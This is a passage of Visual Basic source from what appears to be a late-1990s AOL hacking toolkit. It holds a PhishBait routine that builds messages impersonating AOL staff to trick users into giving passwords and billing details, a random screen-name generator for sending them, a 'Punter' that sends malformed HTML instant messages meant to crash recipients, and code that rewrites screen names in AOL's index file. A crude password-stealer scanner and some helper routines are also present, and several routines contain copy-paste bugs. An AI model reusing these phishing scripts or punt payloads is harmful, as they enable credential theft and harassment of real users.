If asd = 3 Then das$ = dsa$ & "I am Sharon Stevenson, a member of the America Online security task force.  "
If asd = 4 Then das$ = dsa$ & "I am with the America Online Online Security Force.  "
If asd = 5 Then das$ = dsa$ & "I am with the America Online billing department.  "
If asd = 6 Then das$ = dsa$ & "I am with the America Online User Department.  "
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = das$ & "Due to some invalid information, we need you to verify your log-on password to avoid account cancellation.  "
If asd = 2 Then das$ = das$ & "Due to a virus in one of our servers, I am required to validate your password. Failure to do so will cause in immediate cancellation of this account.  "
If asd = 3 Then das$ = das$ & "We have reason to believe that an unauthorized user is loggin on to your account.  We suggest you change your password and send it to me.  Failure to do so will result in immediate cancellation of your account.  "
If asd = 4 Then das$ = das$ & "Due to a problem we're experiencing with AOLNet, we need you to verify your log-in password to me so that you can continue your current session with America Online.  "
If asd = 5 Then das$ = das$ & "While checking out dial-up records I have seen people logging on from Canada using this account. Please verify that you are the correct user by giving me your password. Failure to do so will result in immediate cancellation of this account.  "
If asd = 6 Then das$ = das$ & "You may have heard about the recent attack on our servers, all information regarding your account was lost. Please IM me back with your billing information.  "
 Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = das$ & "Sorry for the inconvenience.  Have a nice day.   :-)"
If asd = 2 Then das$ = das$ & "Thank you and have a nice day using America Online.   :-)"
If asd = 3 Then das$ = das$ & "Thank you and have a nice day.   :-)"
If asd = 4 Then das$ = das$ & "Thank you.   :-)"
If asd = 5 Then das$ = das$ & "Thank you, and enjoy your time on America Online.   :-) "
If asd = 6 Then das$ = das$ & "Thank you for your time and cooperation and thank you for making America Online number 1!    :-) "
 
PhishBait = das$

 
End Function
Sub PhishGenerator(txt As TextBox, txt2 As TextBox)
Randomize
a = Int((Val("26") * Rnd) + 1)
If a = "1" Then
a = ""
ElseIf a = "2" Then: a = "B"
ElseIf a = "3" Then: a = "C"
ElseIf a = "4" Then: a = "D"
ElseIf a = "5" Then: a = ""
ElseIf a = "6" Then: a = "F"
ElseIf a = "7" Then: a = "G"
ElseIf a = "8" Then: a = "H"
ElseIf a = "9" Then: a = ""
ElseIf a = "10" Then: a = "J"
ElseIf a = "11" Then: a = "K"
ElseIf a = "12" Then: a = "L"
ElseIf a = "13" Then: a = "M"
ElseIf a = "14" Then: a = "N"
ElseIf a = "15" Then: a = ""
ElseIf a = "16" Then: a = "P"
ElseIf a = "17" Then: a = "Q"
ElseIf a = "18" Then: a = "R"
ElseIf a = "19" Then: a = "S"
ElseIf a = "20" Then: a = "T"
ElseIf a = "21" Then: a = ""
ElseIf a = "22" Then: a = "V"
ElseIf a = "23" Then: a = "W"
ElseIf a = "24" Then: a = "Y"
ElseIf a = "25" Then: a = "X"
ElseIf a = "26" Then: a = "Z"
End If
txt = a

Randomize
B = Int((Val("37") * Rnd) + 1)
If B = "1" Then
B = "A"
ElseIf B = "2" Then: B = "B"
ElseIf B = "3" Then: B = "C"
ElseIf B = "4" Then: B = "D"
ElseIf B = "5" Then: B = "E"
ElseIf B = "6" Then: B = "F"
ElseIf B = "7" Then: B = "G"
ElseIf B = "8" Then: B = "H"
ElseIf B = "9" Then: B = "I"
ElseIf B = "10" Then: B = "J"
ElseIf B = "11" Then: B = "K"
ElseIf B = "12" Then: B = "L"
ElseIf B = "13" Then: B = "M"
ElseIf B = "14" Then: B = "N"
ElseIf B = "15" Then: B = "O"
ElseIf B = "16" Then: B = "P"
ElseIf B = "17" Then: B = "Q"
ElseIf B = "18" Then: B = "R"
ElseIf B = "19" Then: B = "S"
ElseIf B = "20" Then: B = "T"
ElseIf B = "21" Then: B = "U"
ElseIf B = "22" Then: B = "V"
ElseIf B = "23" Then: B = "W"
ElseIf B = "24" Then: B = "Y"
ElseIf B = "25" Then: B = "X"
ElseIf B = "26" Then: B = "Z"
ElseIf B = "27" Then: B = "0"
ElseIf B = "28" Then: B = "1"
ElseIf B = "29" Then: B = "2"
ElseIf B = "30" Then: B = "3"
ElseIf B = "31" Then: B = "4"
ElseIf B = "32" Then: B = "5"
ElseIf B = "33" Then: B = "6"
ElseIf B = "34" Then: B = "7"
ElseIf B = "35" Then: B = "8"
ElseIf B = "36" Then: B = "9"
ElseIf B = "37" Then: B = " "
End If
txt = a + B

Randomize
c = Int((Val("6") * Rnd) + 1)
If c = "1" Then
c = "A"
ElseIf c = "2" Then: c = "E"
ElseIf c = "3" Then: c = "I"
ElseIf c = "4" Then: c = "O"
ElseIf c = "5" Then: c = "U"
ElseIf c = "6" Then: c = " "
End If
txt = a + B + c

Randomize
D = Int((Val("37") * Rnd) + 1)
If D = "1" Then
D = " "
ElseIf D = "2" Then: D = "B"
ElseIf D = "3" Then: D = "C"
ElseIf D = "4" Then: D = "D"
ElseIf D = "5" Then: D = " "
ElseIf D = "6" Then: D = "F"
ElseIf D = "7" Then: D = "G"
ElseIf D = "8" Then: D = "H"
ElseIf D = "9" Then: D = " "
ElseIf D = "10" Then: D = "J"
ElseIf D = "11" Then: D = "K"
ElseIf D = "12" Then: D = "L"
ElseIf D = "13" Then: D = "M"
ElseIf D = "14" Then: D = "N"
ElseIf D = "15" Then: D = " "
ElseIf D = "16" Then: D = "P"
ElseIf D = "17" Then: D = "Q"
ElseIf D = "18" Then: D = "R"
ElseIf D = "19" Then: D = "S"
ElseIf D = "20" Then: D = "T"
ElseIf D = "21" Then: D = " "
ElseIf D = "22" Then: D = "V"
ElseIf D = "23" Then: D = "W"
ElseIf D = "24" Then: D = "Y"
ElseIf D = "25" Then: D = "X"
ElseIf D = "26" Then: D = "Z"
ElseIf D = "27" Then: D = "0"
ElseIf D = "28" Then: D = "1"
ElseIf D = "29" Then: D = "2"
ElseIf D = "30" Then: D = "3"
ElseIf D = "31" Then: D = "4"
ElseIf D = "32" Then: D = "5"
ElseIf D = "33" Then: D = "6"
ElseIf D = "34" Then: D = "7"
ElseIf D = "35" Then: D = "8"
ElseIf D = "36" Then: D = "9"
ElseIf D = "37" Then: D = " "

End If
txt = a + B + c + D

Randomize
e = Int((Val("6") * Rnd) + 1)
If e = "1" Then
e = "A"
ElseIf e = "2" Then: e = "E"
ElseIf e = "3" Then: e = "I"
ElseIf e = "4" Then: e = "O"
ElseIf e = "5" Then: e = "U"
ElseIf e = "6" Then: e = " "
End If
txt = a + B + c + D + e

Randomize
F = Int((Val("37") * Rnd) + 1)
If F = "1" Then
F = ""
ElseIf F = "2" Then: F = "B"
ElseIf F = "3" Then: F = "C"
ElseIf F = "4" Then: F = "D"
ElseIf F = "5" Then: F = ""
ElseIf F = "6" Then: F = "F"
ElseIf F = "7" Then: F = "G"
ElseIf F = "8" Then: F = "H"
ElseIf F = "9" Then: F = ""
ElseIf F = "10" Then: F = "J"
ElseIf F = "11" Then: F = "K"
ElseIf F = "12" Then: F = "L"
ElseIf F = "13" Then: F = "M"
ElseIf F = "14" Then: F = "N"
ElseIf F = "15" Then: F = ""
ElseIf F = "16" Then: F = "P"
ElseIf F = "17" Then: F = "Q"
ElseIf F = "18" Then: F = "R"
ElseIf F = "19" Then: F = "S"
ElseIf F = "20" Then: F = "T"
ElseIf F = "21" Then: F = ""
ElseIf F = "22" Then: F = "V"
ElseIf F = "23" Then: F = "W"
ElseIf F = "24" Then: F = "Y"
ElseIf F = "25" Then: F = "X"
ElseIf F = "26" Then: F = "Z"
ElseIf F = "27" Then: F = "0"
ElseIf F = "28" Then: F = "1"
ElseIf F = "29" Then: F = "2"
ElseIf F = "30" Then: F = "3"
ElseIf F = "31" Then: F = "4"
ElseIf F = "32" Then: F = "5"
ElseIf F = "33" Then: F = "6"
ElseIf F = "34" Then: F = "7"
ElseIf F = "35" Then: F = "8"
ElseIf F = "36" Then: F = "9"
ElseIf F = "37" Then: F = " "
End If
txt = a + B + c + D + e + F

Randomize
G = Int((Val("6") * Rnd) + 1)
If G = "1" Then
G = "A"
ElseIf G = "2" Then: G = "E"
ElseIf G = "3" Then: G = "I"
ElseIf G = "4" Then: G = "O"
ElseIf G = "5" Then: G = "U"
ElseIf G = "6" Then: G = " "
End If
txt = a + B + c + D + e + F + G

Randomize
H = Int((Val("37") * Rnd) + 1)
If H = "1" Then
H = ""
ElseIf H = "2" Then: H = "B"
ElseIf H = "3" Then: H = "C"
ElseIf H = "4" Then: H = "D"
ElseIf H = "5" Then: H = ""
ElseIf H = "6" Then: H = "F"
ElseIf H = "7" Then: H = "G"
ElseIf H = "8" Then: H = "H"
ElseIf H = "9" Then: H = ""
ElseIf H = "10" Then: H = "J"
ElseIf H = "11" Then: H = "K"
ElseIf H = "12" Then: H = "L"
ElseIf H = "13" Then: H = "M"
ElseIf H = "14" Then: H = "N"
ElseIf H = "15" Then: H = ""
ElseIf H = "16" Then: H = "P"
ElseIf H = "17" Then: H = "Q"
ElseIf H = "18" Then: H = "R"
ElseIf H = "19" Then: H = "S"
ElseIf H = "20" Then: H = "T"
ElseIf H = "21" Then: H = ""
ElseIf H = "22" Then: H = "V"
ElseIf H = "23" Then: H = "W"
ElseIf H = "24" Then: H = "Y"
ElseIf H = "25" Then: H = "X"
ElseIf H = "26" Then: H = "Z"
ElseIf H = "27" Then: H = "0"
ElseIf H = "28" Then: H = "1"
ElseIf H = "29" Then: H = "2"
ElseIf H = "30" Then: H = "3"
ElseIf H = "31" Then: H = "4"
ElseIf H = "32" Then: H = "5"
ElseIf H = "33" Then: H = "6"
ElseIf H = "34" Then: H = "7"
ElseIf H = "35" Then: H = "8"
ElseIf H = "36" Then: H = "9"
ElseIf H = "37" Then: H = " "
End If
txt = a + B + c + D + e + F + G + H

Randomize
i = Int((Val("6") * Rnd) + 1)
If i = "1" Then
i = "E"
ElseIf i = "2" Then: i = "A"
ElseIf i = "3" Then: i = "I"
ElseIf i = "4" Then: i = "O"
ElseIf i = "5" Then: i = "U"
ElseIf i = "6" Then: i = " "
End If
txt = a + B + c + D + e + F + G + H + i

Randomize
j = Int((Val("37") * Rnd) + 1)
If j = "1" Then
j = "A"
ElseIf j = "2" Then: j = "B"
ElseIf j = "3" Then: j = "C"
ElseIf j = "4" Then: j = "D"
ElseIf j = "5" Then: j = "E"
ElseIf j = "6" Then: j = "F"
ElseIf j = "7" Then: j = "G"
ElseIf j = "8" Then: j = "H"
ElseIf j = "9" Then: j = "I"
ElseIf j = "10" Then: j = "J"
ElseIf j = "11" Then: j = "K"
ElseIf j = "12" Then: j = "L"
ElseIf j = "13" Then: j = "M"
ElseIf j = "14" Then: j = "N"
ElseIf j = "15" Then: j = "O"
ElseIf j = "16" Then: j = "P"
ElseIf j = "17" Then: j = "Q"
ElseIf j = "18" Then: j = "R"
ElseIf j = "19" Then: j = "S"
ElseIf j = "20" Then: j = "T"
ElseIf j = "21" Then: j = "U"
ElseIf j = "22" Then: j = "V"
ElseIf j = "23" Then: j = "W"
ElseIf j = "24" Then: j = "Y"
ElseIf j = "25" Then: j = "X"
ElseIf j = "26" Then: j = "Z"
ElseIf j = "27" Then: j = "0"
ElseIf j = "28" Then: j = "1"
ElseIf j = "29" Then: j = "2"
ElseIf j = "30" Then: j = "3"
ElseIf j = "31" Then: j = "4"
ElseIf j = "32" Then: j = "5"
ElseIf j = "33" Then: j = "6"
ElseIf j = "34" Then: j = "7"
ElseIf j = "35" Then: j = "8"
ElseIf j = "36" Then: j = "9"
ElseIf j = "37" Then: j = " "
End If
txt = a + B + c + D + e + F + G + H + j


Randomize
K = Int((Val("37") * Rnd) + 1)
If K = "1" Then
K = "A"
ElseIf K = "2" Then: K = "B"
ElseIf K = "3" Then: K = "C"
ElseIf K = "4" Then: K = "D"
ElseIf K = "5" Then: K = "E"
ElseIf K = "6" Then: K = "F"
ElseIf K = "7" Then: K = "G"
ElseIf K = "8" Then: K = "H"
ElseIf K = "9" Then: K = "I"
ElseIf K = "10" Then: K = "J"
ElseIf K = "11" Then: K = "K"
ElseIf K = "12" Then: K = "L"
ElseIf K = "13" Then: K = "M"
ElseIf K = "14" Then: K = "N"
ElseIf K = "15" Then: K = "O"
ElseIf K = "16" Then: K = "P"
ElseIf K = "17" Then: K = "Q"
ElseIf K = "18" Then: K = "R"
ElseIf K = "19" Then: K = "S"
ElseIf K = "20" Then: K = "T"
ElseIf K = "21" Then: K = "U"
ElseIf K = "22" Then: K = "V"
ElseIf K = "23" Then: K = "W"
ElseIf K = "24" Then: K = "Y"
ElseIf K = "25" Then: K = "X"
ElseIf K = "26" Then: K = "Z"
ElseIf K = "27" Then: K = "0"
ElseIf K = "28" Then: K = "1"
ElseIf K = "29" Then: K = "2"
ElseIf K = "30" Then: K = "3"
ElseIf K = "31" Then: K = "4"
ElseIf K = "32" Then: K = "5"
ElseIf K = "33" Then: K = "6"
ElseIf K = "34" Then: K = "7"
ElseIf K = "35" Then: K = "8"
ElseIf K = "36" Then: K = "9"
ElseIf K = "37" Then: K = ""
End If
txt2 = K
Randomize
l = Int((Val("37") * Rnd) + 1)
If j = "1" Then
l = "A"
ElseIf l = "2" Then: l = "B"
ElseIf l = "3" Then: l = "C"
ElseIf l = "4" Then: l = "D"
ElseIf l = "5" Then: l = "E"
ElseIf l = "6" Then: l = "F"
ElseIf l = "7" Then: l = "G"
ElseIf l = "8" Then: l = "H"
ElseIf l = "9" Then: l = "I"
ElseIf l = "10" Then: l = "j"
ElseIf l = "11" Then: l = "k"
ElseIf l = "12" Then: l = "L"
ElseIf l = "13" Then: l = "M"
ElseIf l = "14" Then: l = "N"
ElseIf l = "15" Then: l = "O"
ElseIf l = "16" Then: l = "P"
ElseIf l = "17" Then: l = "Q"
ElseIf l = "18" Then: l = "R"
ElseIf l = "19" Then: l = "S"
ElseIf l = "20" Then: l = "T"
ElseIf l = "21" Then: l = "U"
ElseIf l = "22" Then: l = "V"
ElseIf l = "23" Then: l = "W"
ElseIf l = "24" Then: l = "Y"
ElseIf l = "25" Then: l = "X"
ElseIf l = "26" Then: l = "Z"
ElseIf l = "27" Then: l = "0"
ElseIf l = "28" Then: l = "1"
ElseIf l = "29" Then: l = "2"
ElseIf l = "30" Then: l = "3"
ElseIf l = "31" Then: l = "4"
ElseIf l = "32" Then: l = "5"
ElseIf l = "33" Then: l = "6"
ElseIf l = "34" Then: l = "7"
ElseIf l = "35" Then: l = "8"
ElseIf l = "36" Then: l = "9"
ElseIf l = "37" Then: l = ""
End If
txt2 = K + l
Randomize
M = Int((Val("37") * Rnd) + 1)
If j = "1" Then
M = "A"
ElseIf M = "2" Then: M = "B"
ElseIf M = "3" Then: M = "C"
ElseIf M = "4" Then: M = "D"
ElseIf M = "5" Then: M = "E"
ElseIf M = "6" Then: M = "F"
ElseIf M = "7" Then: M = "G"
ElseIf M = "8" Then: M = "H"
ElseIf M = "9" Then: M = "I"
ElseIf M = "10" Then: M = "k"
ElseIf M = "11" Then: M = "l"
ElseIf M = "12" Then: M = "m"
ElseIf M = "13" Then: M = "M"
ElseIf M = "14" Then: M = "N"
ElseIf M = "15" Then: M = "O"
ElseIf M = "16" Then: M = "P"
ElseIf M = "17" Then: M = "Q"
ElseIf M = "18" Then: M = "R"
ElseIf M = "19" Then: M = "S"
ElseIf M = "20" Then: M = "T"
ElseIf M = "21" Then: M = "U"
ElseIf M = "22" Then: M = "V"
ElseIf M = "23" Then: M = "W"
ElseIf M = "24" Then: M = "Y"
ElseIf M = "25" Then: M = "X"
ElseIf M = "26" Then: M = "Z"
ElseIf M = "27" Then: M = "0"
ElseIf M = "28" Then: M = "1"
ElseIf M = "29" Then: M = "2"
ElseIf M = "30" Then: M = "3"
ElseIf M = "31" Then: M = "4"
ElseIf M = "32" Then: M = "5"
ElseIf M = "33" Then: M = "6"
ElseIf M = "34" Then: M = "7"
ElseIf M = "35" Then: M = "8"
ElseIf M = "36" Then: M = "9"
ElseIf M = "37" Then: M = ""
End If
txt2 = K + l + M

Randomize
n = Int((Val("37") * Rnd) + 1)
If j = "1" Then
n = "A"
ElseIf n = "2" Then: n = "B"
ElseIf n = "3" Then: n = "C"
ElseIf n = "4" Then: n = "D"
ElseIf n = "5" Then: n = "E"
ElseIf n = "6" Then: n = "F"
ElseIf n = "7" Then: n = "G"
ElseIf n = "8" Then: n = "H"
ElseIf n = "9" Then: n = "I"
ElseIf n = "10" Then: n = "k"
ElseIf n = "11" Then: n = "l"
ElseIf n = "12" Then: n = "m"
ElseIf n = "13" Then: n = "n"
ElseIf n = "14" Then: n = "N"
ElseIf n = "15" Then: n = "O"
ElseIf n = "16" Then: n = "P"
ElseIf n = "17" Then: n = "Q"
ElseIf n = "18" Then: n = "R"
ElseIf n = "19" Then: n = "S"
ElseIf n = "20" Then: n = "T"
ElseIf n = "21" Then: n = "U"
ElseIf n = "22" Then: n = "V"
ElseIf n = "23" Then: n = "W"
ElseIf n = "24" Then: n = "Y"
ElseIf n = "25" Then: n = "X"
ElseIf n = "26" Then: n = "Z"
ElseIf n = "27" Then: n = "0"
ElseIf n = "28" Then: n = "1"
ElseIf n = "29" Then: n = "2"
ElseIf n = "30" Then: n = "3"
ElseIf n = "31" Then: n = "4"
ElseIf n = "32" Then: n = "5"
ElseIf n = "33" Then: n = "6"
ElseIf n = "34" Then: n = "7"
ElseIf n = "35" Then: n = "8"
ElseIf n = "36" Then: n = "9"
ElseIf n = "37" Then: n = ""
End If
txt2 = K + l + M + n

Randomize
o = Int((Val("37") * Rnd) + 1)
If j = "1" Then
o = "A"
ElseIf o = "2" Then: o = "B"
ElseIf o = "3" Then: o = "C"
ElseIf o = "4" Then: o = "D"
ElseIf o = "5" Then: o = "E"
ElseIf o = "6" Then: o = "F"
ElseIf o = "7" Then: o = "G"
ElseIf o = "8" Then: o = "H"
ElseIf o = "9" Then: o = "I"
ElseIf o = "10" Then: o = "k"
ElseIf o = "11" Then: o = "l"
ElseIf o = "12" Then: o = "m"
ElseIf o = "13" Then: o = "M"
ElseIf o = "14" Then: o = "N"
ElseIf o = "15" Then: o = "O"
ElseIf o = "16" Then: o = "P"
ElseIf o = "17" Then: o = "Q"
ElseIf o = "18" Then: o = "R"
ElseIf o = "19" Then: o = "S"
ElseIf o = "20" Then: o = "T"
ElseIf o = "21" Then: o = "U"
ElseIf o = "22" Then: o = "V"
ElseIf o = "23" Then: o = "W"
ElseIf o = "24" Then: o = "Y"
ElseIf o = "25" Then: o = "X"
ElseIf o = "26" Then: o = "Z"
ElseIf o = "27" Then: o = "0"
ElseIf o = "28" Then: o = "1"
ElseIf o = "29" Then: o = "2"
ElseIf o = "30" Then: o = "3"
ElseIf o = "31" Then: o = "4"
ElseIf o = "32" Then: o = "5"
ElseIf o = "33" Then: o = "6"
ElseIf o = "34" Then: o = "7"
ElseIf o = "35" Then: o = "8"
ElseIf o = "36" Then: o = "9"
ElseIf o = "37" Then: o = ""
End If
txt2 = K + l + M + n + o

End Sub



Function PlayAvi()
'Plays a AVI File Change the path Below to your
'AVI Path
lRet = mciSendString("play c:\windows\help\scroll.avi", 0&, 0, 0)
End Function

Function PlayMIDI()
'Plays a Midi File Change the path Below to your
'Midi Path
lRet = mciSendString("play C:\imagine98\1.mid", 0&, 0, 0) ' or whatever the File Name is

End Function

Public Sub PrivateRoom(Room As String)
    Call KeyWord("aol://2719:2-2-" & Room$)
End Sub

Public Sub PublicRoom(Room As String)
    Call KeyWord("aol://2719:21-2-" & Room$)
End Sub


Sub Punter(text)
'this is a fun  punt string
' it is best to put it in a
'timer... Make sure u have a
'stop button or it will just keep goin
Dim Punt
Punt = "</P><P ALIGN=CENTER><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>"
'that made it so I din't have
'to type as much shit below

Dim pu
pu = "<P><body bgcolor=#000000><HTML><HTML><P><body bgcolor=#0000FF><HTML><HTML><P><body bgcolor=#FF0000><HTML><HTML><P><body bgcolor=#00FF00><HTML><HTML><P><body bgcolor=#C0C0C0><P><body bgcolor=#000000><HTML><HTML><P><body bgcolor=#0000FF><HTML><HTML><P><body bgcolor=#FF0000><HTML><HTML><P><body bgcolor=#00FF00><HTML><HTML><P><body bgcolor=#C0C0C0><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>"
Call AOL4_IM(text, pu)
Call AOL4_IM(text, Punt)

End Sub


Sub PWSscan(flename, txt As TextBox)
If txt.text = "" Then
MsgBox "You Have To Select A Directory!"
Exit Sub
End If
bwap = "check"
yo = "mail"
nutts = "you've"
nutts2 = "&sent"
heya = bwap & " " & yo & " " & nutts & " " & nutts2
txt.text = LCase(txt.text)
SendChat "PWS Scanner [On]"
DoEvents
TimeOut 0.1
SendChat "[" + LCase(txt) + LCase(flename) + " ]"
DoEvents
TimeOut 0.1
SendChat "Status: Scaning File"
TimeOut (1)
hello& = filename
Open hello& For Binary As #1
lent = FileLen(hello&)

For i = 1 To lent Step 32000
  
  temp$ = String$(32000, " ")
  Get #1, i, temp$
  temp$ = LCase$(temp$)
  If InStr(temp$, heya) Then
    Close
    SendChat "[" + LCase(txt) + LCase(flename) + " ]"
    TimeOut 0.1
    SendChat "Is A PWS!"
    mb1 = MsgBox("This File Is A Password Stealer Do You Wan't To Delete It?")
    Select Case mb1
    Case 6:
    
    SendChat "[" + LCase(txt) + LCase(flename) + " ]"
    TimeOut (0.5)
    SendChat "Is Being Deleted!"
        Kill "" & txt.text + filename
    MsgBox "The Password Stealer Has Been Removed"
    Case 7: Exit Sub
    End Select
    Exit Sub
  End If
  i = i - 50
Next i
Close
TimeOut (1)
MsgBox "This Is Not A Password Stealer"
SendChat "[" + LCase(txt) + LCase(flename) + " ]"
TimeOut 0.1
SendChat "Is Not A PWS!"
End Sub
Public Function ReplaceString(MyString As String, ToFind As String, ReplaceWith As String) As String
    Dim Spot As Long, NewSpot As Long, LeftString As String
    Dim RightString As String, NewString As String
    Spot& = InStr(LCase(MyString$), LCase(ToFind))
    NewSpot& = Spot&
    Do
        If NewSpot& > 0& Then
            LeftString$ = Left(MyString$, NewSpot& - 1)
            If Spot& + Len(ToFind$) <= Len(MyString$) Then
                RightString$ = Right(MyString$, Len(MyString$) - NewSpot& - Len(ToFind$) + 1)
            Else
                RightString = ""
            End If
            NewString$ = LeftString$ & ReplaceWith$ & RightString$
            MyString$ = NewString$
        Else
            NewString$ = MyString$
        End If
        Spot& = NewSpot& + Len(ReplaceWith$)
        If Spot& > 0 Then
            NewSpot& = InStr(Spot&, LCase(MyString$), LCase(ToFind$))
        End If
    Loop Until NewSpot& < 1
    ReplaceString$ = NewString$
End Function
Function ReplaceText(text, charfind, charchange)
If InStr(text, charfind) = 0 Then
ReplaceText = text
Exit Function
End If

For Replace = 1 To Len(text)
thechar$ = Mid(text, Replace, 1)
thechars$ = thechars$ & thechar$

If thechar$ = charfind Then
thechars$ = Mid(thechars$, 1, Len(thechars$) - 1) + charchange
End If
Next Replace

ReplaceText = thechars$

End Function

Sub ResetSN(SN$, aoldir$, Replace$)
l0036 = Len(SN$)
Select Case l0036
Case 3
i = SN$ + "       "
Case 4
i = SN$ + "      "
Case 5
i = SN$ + "     "
Case 6
i = SN$ + "    "
Case 7
i = SN$ + "   "
Case 8
i = SN$ + "  "
Case 9
i = SN$ + " "
Case 10
i = SN$
End Select
l0036 = Len(Replace$)
Select Case l0036
Case 3
Replace$ = Replace$ + "       "
Case 4
Replace$ = Replace$ + "      "
Case 5
Replace$ = Replace$ + "     "
Case 6
Replace$ = Replace$ + "    "
Case 7
Replace$ = Replace$ + "   "
Case 8
Replace$ = Replace$ + "  "
Case 9
Replace$ = Replace$ + " "
Case 10
Replace$ = Replace$
End Select
X = 1
Do Until 2 > 3
text$ = ""
DoEvents
On Error Resume Next
Open aoldir$ + "\idb\main.idx" For Binary As #1
If Err Then Exit Sub
text$ = String(32000, 0)
Get #1, X, text$
Close #1
Open aoldir$ + "\idb\main.idx" For Binary As #2
Where1 = InStr(1, text$, i, 1)
If Where1 Then
Mid(text$, Where1) = Replace$
ReplaceX$ = Replace$
Put #2, X + Where1 - 1, ReplaceX$
401:
DoEvents
Where2 = InStr(1, text$, i, 1)
If Where2 Then
Mid(text$, Where2) = Replace$
Put #2, X + Where2 - 1, ReplaceX$
GoTo 401
End If
End If
X = X + 32000
LF2 = LOF(2)
Close #2
If X > LF2 Then GoTo 301
Loop
301:
End Sub


Sub RespondIM(message)
'This finds an IM sent to you, answers it with a
'message of "message", sends it and then closes the
'IM window
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")

IM% = Findchildbytitle(MDI%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = Findchildbytitle(MDI%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Sub
Greed:
e = FindChildByClass(IM%, "RICHCNTL")

e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)

e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e2 = GetWindow(e, GW_HWNDNEXT) 'Send Text
e = GetWindow(e2, GW_HWNDNEXT) 'Send Button
Call SendMessageByString(e2, WM_SETTEXT, 0, message)
ClickIcon (e)
Call TimeOut(0.8)
IM% = Findchildbytitle(MDI%, "  Instant Message From:")
e = FindChildByClass(IM%, "RICHCNTL")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT) 'cancel button...
'to close the IM window
ClickIcon (e)
End Sub

Function ReverseText(text)
For Words = Len(text) To 1 Step -1
ReverseText = ReverseText & Mid(text, Words, 1)
Next Words


End Function

